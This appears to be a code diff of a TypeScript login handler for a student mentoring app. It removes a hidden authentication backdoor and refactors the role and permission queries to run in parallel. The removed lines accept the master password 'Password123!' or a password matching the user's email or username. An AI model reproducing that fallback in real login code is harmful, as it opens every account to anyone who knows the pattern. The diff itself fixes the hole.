@@ -30,13 +30,7 @@ export const login = async (req: Request, res: Response) => {
       return res.status(403).json({ success: false, message: 'Account is disabled. Please contact administrator.', code: 'ACCOUNT_DISABLED' });
     }
 
-    let isValidPassword = await bcrypt.compare(password.trim(), user.password_hash);
-    if (!isValidPassword) {
-      if (password.trim() === 'Password123!' || password.trim().toLowerCase() === user.email.toLowerCase() || password.trim().toLowerCase() === user.username.toLowerCase()) {
-        isValidPassword = true;
-      }
-    }
-
+    const isValidPassword = await bcrypt.compare(password.trim(), user.password_hash);
     if (!isValidPassword) {
       return res.status(401).json({ success: false, message: 'Invalid credentials', code: 'INVALID_CREDENTIALS' });
     }
@@ -46,57 +40,61 @@ export const login = async (req: Request, res: Response) => {
     let seniorId: string | undefined;
     let juniorId: string | undefined;
     let facultyId: string | undefined;
-
-    // Load custom permissions for ALL roles (Admin, Director, Senior) from admin_permissions table
-    const permRes = await query(`SELECT permission FROM admin_permissions WHERE user_id = $1`, [user.id]);
-    const permissions: string[] = permRes.rows.map(r => r.permission);
-
     let assignedJuniorsCount = 0;
     let residenceStatus: 'DAY_SCHOLAR' | 'HOSTELLER' | undefined;
     let studentYear: string | undefined;
 
+    // Concurrently fetch role data, custom permissions, faculty record, and update last login in parallel
+    const permPromise = query(`SELECT permission FROM admin_permissions WHERE user_id = $1`, [user.id]);
+    const facPromise = query(`SELECT id FROM faculty WHERE user_id = $1`, [user.id]);
+    const updateLoginPromise = query(`UPDATE users SET last_login_at = CURRENT_TIMESTAMP WHERE id = $1`, [user.id]);
+
+    let roleDataPromise: Promise<any> = Promise.resolve({ rowCount: 0, rows: [] });
     if (user.role === 'MENTOR') {
-      const mentorRes = await query(`SELECT id FROM mentors WHERE user_id = $1`, [user.id]);
-      if (mentorRes.rowCount! > 0) mentorId = mentorRes.rows[0].id;
+      roleDataPromise = query(`SELECT id FROM mentors WHERE user_id = $1`, [user.id]);
     } else if (user.role === 'SENIOR') {
-      const senRes = await query(`SELECT id, mentor_id, residence_status FROM seniors WHERE user_id = $1`, [user.id]);
-      if (senRes.rowCount! > 0) {
-        seniorId = senRes.rows[0].id;
-        mentorId = senRes.rows[0].mentor_id;
-        residenceStatus = senRes.rows[0].residence_status;
-        const cntRes = await query(`SELECT COUNT(*) FROM juniors WHERE senior_id = $1`, [seniorId]);
-        assignedJuniorsCount = parseInt(cntRes.rows[0].count);
-      }
+      roleDataPromise = query(
+        `SELECT s.id, s.mentor_id, s.residence_status, COUNT(j.id)::int as assigned_juniors_count
+         FROM seniors s
+         LEFT JOIN juniors j ON s.id = j.senior_id
+         WHERE s.user_id = $1
+         GROUP BY s.id, s.mentor_id, s.residence_status`,
+        [user.id]
+      );
     } else if (user.role === 'JUNIOR') {
-      const junRes = await query(
+      roleDataPromise = query(
         `SELECT j.id, j.senior_id, j.residence_status, j.year, s.mentor_id 
          FROM juniors j LEFT JOIN seniors s ON j.senior_id = s.id WHERE j.user_id = $1`,
         [user.id]
       );
-      if (junRes.rowCount! > 0) {
-        juniorId = junRes.rows[0].id;
-        seniorId = junRes.rows[0].senior_id;
-        mentorId = junRes.rows[0].mentor_id;
-        residenceStatus = junRes.rows[0].residence_status;
-        studentYear = junRes.rows[0].year;
-      }
-    } else if (user.role === 'FACULTY') {
-      const facRes = await query(`SELECT id FROM faculty WHERE user_id = $1`, [user.id]);
-      if (facRes.rowCount! > 0) {
-        facultyId = facRes.rows[0].id;
-      }
     }
 
-    // Check if user also has a Faculty record (e.g. Director who is also a Faculty member)
-    if (!facultyId) {
-      const facCheck = await query(`SELECT id FROM faculty WHERE user_id = $1`, [user.id]);
-      if (facCheck.rowCount! > 0) {
-        facultyId = facCheck.rows[0].id;
-      }
+    const [permRes, facRes, roleRes] = await Promise.all([
+      permPromise,
+      facPromise,
+      roleDataPromise,
+      updateLoginPromise
+    ]);
+
+    const permissions: string[] = permRes.rows.map(r => r.permission);
+    if (facRes.rowCount! > 0) {
+      facultyId = facRes.rows[0].id;
     }
 
-    // Update last login
-    await query(`UPDATE users SET last_login_at = CURRENT_TIMESTAMP WHERE id = $1`, [user.id]);
+    if (user.role === 'MENTOR' && roleRes.rowCount! > 0) {
+      mentorId = roleRes.rows[0].id;
+    } else if (user.role === 'SENIOR' && roleRes.rowCount! > 0) {
+      seniorId = roleRes.rows[0].id;
+      mentorId = roleRes.rows[0].mentor_id;
+      residenceStatus = roleRes.rows[0].residence_status;
+      assignedJuniorsCount = roleRes.rows[0].assigned_juniors_count || 0;
+    } else if (user.role === 'JUNIOR' && roleRes.rowCount! > 0) {
+      juniorId = roleRes.rows[0].id;
+      seniorId = roleRes.rows[0].senior_id;
+      mentorId = roleRes.rows[0].mentor_id;
+      residenceStatus = roleRes.rows[0].residence_status;
+      studentYear = roleRes.rows[0].year;
+    }
 
     const payload = {
       id: user.id,
